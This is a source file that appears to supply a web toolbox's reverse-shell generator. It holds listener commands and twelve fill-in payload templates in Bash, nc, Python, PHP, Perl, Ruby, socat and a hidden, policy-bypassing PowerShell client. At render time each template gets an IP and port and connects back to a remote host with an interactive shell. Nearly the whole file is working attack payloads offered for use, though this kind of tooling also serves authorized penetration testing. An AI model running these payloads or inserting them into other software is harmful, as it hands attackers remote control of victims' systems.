// Reverse-shell payloads for the /toolbox generator.
// Tokens {ip} {port} {shell} are substituted at render time.
export const shells = ['/bin/bash', '/bin/sh', '/bin/zsh', 'cmd.exe', 'powershell']

export const listeners = [
  { label: 'nc', tpl: `nc -lvnp {port}` },
  { label: 'ncat', tpl: `ncat -lvnp {port}` },
  { label: 'socat', tpl: `socat -d -d TCP-LISTEN:{port},reuseaddr STDOUT` },
  { label: 'pwncat', tpl: `pwncat-cs -lp {port}` },
]

export const payloads = [
  { id: 'bash-i', label: 'Bash -i', tpl: `bash -i >& /dev/tcp/{ip}/{port} 0>&1` },
  { id: 'bash-196', label: 'Bash 196', tpl: `0<&196;exec 196<>/dev/tcp/{ip}/{port}; sh <&196 >&196 2>&196` },
  { id: 'sh', label: 'sh -i', tpl: `/bin/sh -i >& /dev/tcp/{ip}/{port} 0>&1` },
  { id: 'nc-e', label: 'nc -e', tpl: `nc {ip} {port} -e {shell}` },
  { id: 'nc-mkfifo', label: 'nc mkfifo', tpl: `rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|{shell} -i 2>&1|nc {ip} {port} >/tmp/f` },
  { id: 'ncat-e', label: 'ncat -e', tpl: `ncat {ip} {port} -e {shell}` },
  { id: 'python3', label: 'Python3', tpl: `python3 -c 'import socket,os,pty;s=socket.socket();s.connect(("{ip}",{port}));[os.dup2(s.fileno(),f) for f in(0,1,2)];pty.spawn("{shell}")'` },
  { id: 'php', label: 'PHP', tpl: `php -r '$sock=fsockopen("{ip}",{port});exec("{shell} -i <&3 >&3 2>&3");'` },
  { id: 'perl', label: 'Perl', tpl: `perl -e 'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("{shell} -i");};'` },
  { id: 'ruby', label: 'Ruby', tpl: `ruby -rsocket -e'f=TCPSocket.open("{ip}",{port}).to_i;exec sprintf("{shell} -i <&%d >&%d 2>&%d",f,f,f)'` },
  { id: 'socat', label: 'socat', tpl: `socat TCP:{ip}:{port} EXEC:{shell},pty,stderr,setsid,sigint,sane` },
  { id: 'powershell', label: 'PowerShell', tpl: `powershell -nop -W hidden -noni -ep bypass -c "$c=New-Object Net.Sockets.TCPClient('{ip}',{port});$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$r=(iex $d 2>&1|Out-String);$r2=$r+'PS '+(pwd).Path+'> ';$x=([text.encoding]::ASCII).GetBytes($r2);$s.Write($x,0,$x.Length);$s.Flush()};$c.Close()"` },
]
